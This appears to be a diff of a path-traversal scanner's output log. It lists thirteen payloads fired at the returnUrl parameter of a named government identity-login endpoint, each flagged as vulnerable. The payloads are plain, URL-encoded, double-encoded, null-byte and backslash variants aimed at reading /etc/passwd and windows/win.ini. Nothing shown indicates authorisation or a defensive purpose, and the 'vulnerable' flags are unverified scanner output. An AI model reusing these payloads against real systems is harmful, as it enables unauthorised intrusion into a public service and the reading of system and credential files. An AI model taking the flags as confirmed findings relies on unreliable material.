@@ -790,3 +790,94 @@ Source: traversal-windows-forward
 STATUS: *** VULNERABLE ***
 Payload: ../../../windows/win.ini
 --------------------------------------------------
+Method: GET
+URL: https://iam.moenergy.gov.sa/Abp/Languages/Switch?culture=ar&uiCulture=ar&returnUrl=%2FAccount%2FNafath
+Parameter: returnUrl
+Source: traversal-basic-3
+STATUS: *** VULNERABLE ***
+Payload: ../../../etc/passwd
+--------------------------------------------------
+Method: GET
+URL: https://iam.moenergy.gov.sa/Abp/Languages/Switch?culture=ar&uiCulture=ar&returnUrl=%2FAccount%2FNafath
+Parameter: returnUrl
+Source: traversal-basic-4
+STATUS: *** VULNERABLE ***
+Payload: ../../../../etc/passwd
+--------------------------------------------------
+Method: GET
+URL: https://iam.moenergy.gov.sa/Abp/Languages/Switch?culture=ar&uiCulture=ar&returnUrl=%2FAccount%2FNafath
+Parameter: returnUrl
+Source: traversal-basic-5
+STATUS: *** VULNERABLE ***
+Payload: ../../../../../etc/passwd
+--------------------------------------------------
+Method: GET
+URL: https://iam.moenergy.gov.sa/Abp/Languages/Switch?culture=ar&uiCulture=ar&returnUrl=%2FAccount%2FNafath
+Parameter: returnUrl
+Source: traversal-basic-6
+STATUS: *** VULNERABLE ***
+Payload: ../../../../../../etc/passwd
+--------------------------------------------------
+Method: GET
+URL: https://iam.moenergy.gov.sa/Abp/Languages/Switch?culture=ar&uiCulture=ar&returnUrl=%2FAccount%2FNafath
+Parameter: returnUrl
+Source: traversal-basic-7
+STATUS: *** VULNERABLE ***
+Payload: ../../../../../../../etc/passwd
+--------------------------------------------------
+Method: GET
+URL: https://iam.moenergy.gov.sa/Abp/Languages/Switch?culture=ar&uiCulture=ar&returnUrl=%2FAccount%2FNafath
+Parameter: returnUrl
+Source: traversal-url-encoded
+STATUS: *** VULNERABLE ***
+Payload: ..%2f..%2f..%2fetc%2fpasswd
+--------------------------------------------------
+Method: GET
+URL: https://iam.moenergy.gov.sa/Abp/Languages/Switch?culture=ar&uiCulture=ar&returnUrl=%2FAccount%2FNafath
+Parameter: returnUrl
+Source: traversal-double-url-encoded
+STATUS: *** VULNERABLE ***
+Payload: ..%252f..%252f..%252fetc%252fpasswd
+--------------------------------------------------
+Method: GET
+URL: https://iam.moenergy.gov.sa/Abp/Languages/Switch?culture=ar&uiCulture=ar&returnUrl=%2FAccount%2FNafath
+Parameter: returnUrl
+Source: traversal-dot-encoded
+STATUS: *** VULNERABLE ***
+Payload: %2e%2e/%2e%2e/%2e%2e/etc/passwd
+--------------------------------------------------
+Method: GET
+URL: https://iam.moenergy.gov.sa/Abp/Languages/Switch?culture=ar&uiCulture=ar&returnUrl=%2FAccount%2FNafath
+Parameter: returnUrl
+Source: traversal-null-byte
+STATUS: *** VULNERABLE ***
+Payload: ..%00/..%00/..%00/etc/passwd
+--------------------------------------------------
+Method: GET
+URL: https://iam.moenergy.gov.sa/Abp/Languages/Switch?culture=ar&uiCulture=ar&returnUrl=%2FAccount%2FNafath
+Parameter: returnUrl
+Source: traversal-absolute-null-byte
+STATUS: *** VULNERABLE ***
+Payload: /etc/passwd%00
+--------------------------------------------------
+Method: GET
+URL: https://iam.moenergy.gov.sa/Abp/Languages/Switch?culture=ar&uiCulture=ar&returnUrl=%2FAccount%2FNafath
+Parameter: returnUrl
+Source: traversal-windows-backslash
+STATUS: *** VULNERABLE ***
+Payload: ..\..\..\windows\win.ini
+--------------------------------------------------
+Method: GET
+URL: https://iam.moenergy.gov.sa/Abp/Languages/Switch?culture=ar&uiCulture=ar&returnUrl=%2FAccount%2FNafath
+Parameter: returnUrl
+Source: traversal-windows-encoded
+STATUS: *** VULNERABLE ***
+Payload: ..%5c..%5c..%5cwindows%5cwin.ini
+--------------------------------------------------
+Method: GET
+URL: https://iam.moenergy.gov.sa/Abp/Languages/Switch?culture=ar&uiCulture=ar&returnUrl=%2FAccount%2FNafath
+Parameter: returnUrl
+Source: traversal-windows-forward
+STATUS: *** VULNERABLE ***
+Payload: ../../../windows/win.ini
+--------------------------------------------------
